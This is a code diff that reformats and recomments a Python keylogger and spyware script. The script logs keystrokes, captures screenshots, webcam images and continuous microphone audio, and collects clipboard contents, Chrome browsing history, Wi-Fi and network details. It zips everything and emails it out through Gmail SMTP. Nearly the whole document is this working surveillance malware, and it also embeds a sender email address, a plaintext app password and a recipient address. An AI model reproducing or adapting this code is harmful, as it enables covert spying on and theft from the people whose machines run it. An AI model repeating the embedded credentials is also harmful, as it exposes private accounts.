@@ -4,6 +4,8 @@ import platform
 import smtplib
 import subprocess
 import threading
+import time
+import shutil
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -20,32 +22,36 @@ import sounddevice as sd
 from pynput import keyboard
 from cv2 import VideoCapture, imwrite
 import schedule
-import time
-import shutil
 
+# Inform user how to stop the keylogger session
 print("Press ESC to stop the Keylog Session")
 
-# Global Variables
-email_address = "work.nihalrahman@gmail.com"  # Enter sender email
-password = "tdteozexqqomwdzy"  # Enter sender app password
-toaddr = "prabhatbajpai2005@gmail.com"  # Enter recipient email
+# ---------------------------- Configuration Section ----------------------------
 
-file_path = os.getcwd() + "\\"  # File save path
-key = Fernet.generate_key()  # Generate an encryption key
-fernet = Fernet(key)
+# Email credentials and recipient
+email_address = "work.nihalrahman@gmail.com"  # Sender email
+password = "tdteozexqqomwdzy"  # App password for sender
+toaddr = "prabhatbajpai2005@gmail.com"  # Recipient email
 
+# File and session configuration
+file_path = os.getcwd() + "\\"  # Base directory path
+key = Fernet.generate_key()  # Encryption key generation
+fernet = Fernet(key)  # Fernet object for encryption
+
+# Timestamped folder structure
 currtime = datetime.now().strftime("%Y%m%d%H%M%S")
 sessions_folder = os.path.join(file_path, f"sessions", f"session_{currtime}")
 screenshots_folder = os.path.join(sessions_folder, "screenshots")
 webcam_folder = os.path.join(sessions_folder, "webcam_images")
-stop_microphone_event = threading.Event()
-# Create necessary directories
+stop_microphone_event = threading.Event()  # Event to stop the microphone recording thread
+
+# Create directories
 os.makedirs(sessions_folder, exist_ok=True)
 os.makedirs(screenshots_folder, exist_ok=True)
 os.makedirs(webcam_folder, exist_ok=True)
 
+# ---------------------------- Email Function ----------------------------
 
-# Email functionality
 def send_email(filename, attachment, toaddr):
     """Send an email with the specified attachment."""
     try:
@@ -55,7 +61,7 @@ def send_email(filename, attachment, toaddr):
         msg['Subject'] = "Log File"
         msg.attach(MIMEText(f"Attached file: {filename}", 'plain'))
 
-        if os.path.exists(attachment):  # Ensure the file exists
+        if os.path.exists(attachment):
             with open(attachment, 'rb') as attach_file:
                 part = MIMEBase('application', 'octet-stream')
                 part.set_payload(attach_file.read())
@@ -63,36 +69,37 @@ def send_email(filename, attachment, toaddr):
                 part.add_header('Content-Disposition', f"attachment; filename={filename}")
                 msg.attach(part)
 
-            with smtplib.SMTP('smtp.gmail.com', 587) as server:  # Connect to SMTP server
+            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                 server.starttls()
                 server.login(email_address, password)
                 server.sendmail(email_address, toaddr, msg.as_string())
                 print(f"Email sent successfully to {toaddr}")
         else:
             print(f"Attachment file {attachment} not found.")
-    
+
     except Exception as e:
         print(f"An error occurred while sending email: {e}")
 
+# ---------------------------- System Info Logger ----------------------------
 
-# Data collection functions
 def system_information():
-    """Gather system information and save it to a text file."""
+    """Gather system info and write to file."""
     with open(os.path.join(sessions_folder, "system_info.txt"), "w") as f:
         hostname = socket.gethostname()
         f.write(f"Hostname: {hostname}\n")
         f.write(f"Private IP: {socket.gethostbyname(hostname)}\n")
         try:
             f.write(f"Public IP: {get('https://api.ipify.org').text}\n")
-        except Exception:
+        except:
             f.write("Could not retrieve public IP address.\n")
         f.write(f"Processor: {platform.processor()}\n")
         f.write(f"System: {platform.system()} {platform.version()}\n")
         f.write(f"Machine: {platform.machine()}\n")
 
+# ---------------------------- Clipboard Logger ----------------------------
 
 def copy_clipboard():
-    """Copy data from the clipboard and save it."""
+    """Copy clipboard contents and write to file."""
     clipboard_path = os.path.join(sessions_folder, "clipboard.txt")
     with open(clipboard_path, "w") as f:
         try:
@@ -102,15 +109,10 @@ def copy_clipboard():
         except:
             f.write("Clipboard could not be accessed.\n")
 
+# ---------------------------- Audio Recorder ----------------------------
 
 def microphone_thread():
-    """Record audio for a specified duration and save it as a .wav file."""
-    # myrecording = sd.rec(int(15 * 44100), samplerate=44100, channels=2)
-    # sd.wait()
-    # write(os.path.join(sessions_folder, "audio.wav"), 44100, myrecording)
-
-    #neeche new code
-
+    """Continuously record 15s audio clips until stopped."""
     while not stop_microphone_event.is_set(): 
         try:
             print("Recording audio...")
@@ -118,63 +120,57 @@ def microphone_thread():
             sd.wait()
             audio_filename = os.path.join(sessions_folder, f"audio_{datetime.now().strftime('%Y%m%d%H%M%S')}.wav")
             write(audio_filename, 44100, myrecording)
-            # write(os.path.join(sessions_folder, "audio.wav"), 44100, myrecording)
             print(f"Audio recorded and saved as {audio_filename}")
         except Exception as e:
             print(f"Error in microphone recording: {e}")
 
+# ---------------------------- Screenshot Capturer ----------------------------
 
 def screenshots():
-    """Take a screenshot and save it to the screenshots folder."""
+    """Take a screenshot and save it."""
     im = ImageGrab.grab()
     im.save(os.path.join(screenshots_folder, f"screenshot_{datetime.now().strftime('%Y%m%d%H%M%S')}.png"))
 
+# ---------------------------- Webcam Capturer ----------------------------
 
 def webcam_capture():
-    """Capture an image from the webcam and save it."""
+    """Capture a webcam image and save it."""
     cam = VideoCapture(0)
     result, image = cam.read()
     if result:
         imwrite(os.path.join(webcam_folder, f"webcam_{datetime.now().strftime('%Y%m%d%H%M%S')}.png"), image)
     cam.release()
 
+# ---------------------------- Keylogger Functions ----------------------------
 
-# Keylogging functionality
 def on_press(key):
     """Handle key press events."""
     log_path = os.path.join(sessions_folder, "key_log.txt")
     with open(log_path, "a") as f:
-        if hasattr(key, 'char') and key.char:  # Record printable characters
+        if hasattr(key, 'char') and key.char:
             f.write(key.char)
-        elif key == keyboard.Key.space:  # Record spaces as whitespace
+        elif key == keyboard.Key.space:
             f.write(" ")
         else:
-            f.write(f"[{key}]")  # Record special keys
-
-
-# def on_release(key):
-#     """Stop the keylogger when the escape key is pressed."""
-#     if key == keyboard.Key.esc:
-#         return False
+            f.write(f"[{key}]")
 
 def on_release(key):
-    """Stop the keylogger and send email when the escape key is pressed."""
+    """Stop all tasks and send logs via email on ESC key."""
     if key == keyboard.Key.esc:
-        stop_microphone_event.set()  # Signal the microphone thread to stop
-        microphone_thread_instance.join()  # Wait for the thread to exit (optional)
+        stop_microphone_event.set()
+        microphone_thread_instance.join()
         print("Stopped audio!")
-        # Compress the sessions folder into a .zip file
-        archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
+
+        archive_name = os.path.join(file_path, f"session_{currtime}.zip")
         shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)
-        
-        # Send the .zip file as an attachment
+
         send_email(f"session_{currtime}.zip", archive_name, toaddr)
-        
+
         print("Exiting program after sending email.")
-        return False  # Stop the keylogger
+        return False
 
+# ---------------------------- Network Logger ----------------------------
 
-# Network activity
 def network_activity():
     """Log active network connections."""
     with open(os.path.join(sessions_folder, 'network_info.txt'), "w") as f:
@@ -182,10 +178,10 @@ def network_activity():
         for conn in connections:
             f.write(f"IP: {conn.raddr.ip if conn.raddr else 'N/A'}, Port: {conn.raddr.port if conn.raddr else 'N/A'}, Status: {conn.status}\n")
 
+# ---------------------------- Wi-Fi Info ----------------------------
 
-# Wi-Fi information
 def wifi_info_fetch():
-    """Fetch Wi-Fi information."""
+    """Fetch and log nearby Wi-Fi networks."""
     try:
         networks = subprocess.check_output("netsh wlan show networks", shell=True)
         with open(os.path.join(sessions_folder, "wifi_info.txt"), "w") as f:
@@ -193,10 +189,10 @@ def wifi_info_fetch():
     except Exception as e:
         print("Wi-Fi info fetch error:", e)
 
+# ---------------------------- Chrome History ----------------------------
 
-# Browser history
 def fetch_browser_history():
-    """Retrieve browser history from Chrome."""
+    """Fetch browser history from Chrome."""
     history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
     try:
         conn = sqlite3.connect(history_path)
@@ -208,40 +204,31 @@ def fetch_browser_history():
     except Exception as e:
         print("Could not read browser history:", e)
 
+# ---------------------------- Scheduler ----------------------------
 
-# Scheduled tasks
 schedule.every(4).seconds.do(screenshots)
 schedule.every(2).seconds.do(webcam_capture)
 
-
 def run_scheduled_tasks():
-    """Run scheduled tasks."""
+    """Execute scheduled tasks like screenshots/webcam."""
     while True:
         schedule.run_pending()
         time.sleep(1)
 
+# ---------------------------- Main Execution ----------------------------
 
-# Main Execution
 system_information()
 network_activity()
 copy_clipboard()
 screenshots()
 webcam_capture()
 wifi_info_fetch()
-# microphone()
 
-# # Compress the sessions folder into a .zip file
-# archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
-# shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)
-
-# # Send the .zip file as an attachment
-# send_email(f"session_{currtime}.zip", archive_name, toaddr)
-
-# Start scheduled tasks in a separate thread
+# Start scheduled and audio threads
 schedule_thread = threading.Thread(target=run_scheduled_tasks)
 schedule_thread.daemon = True
 schedule_thread.start()
-# Start microphone in a separate thread
+
 microphone_thread_instance = threading.Thread(target=microphone_thread, daemon=True)
 microphone_thread_instance.start()
 
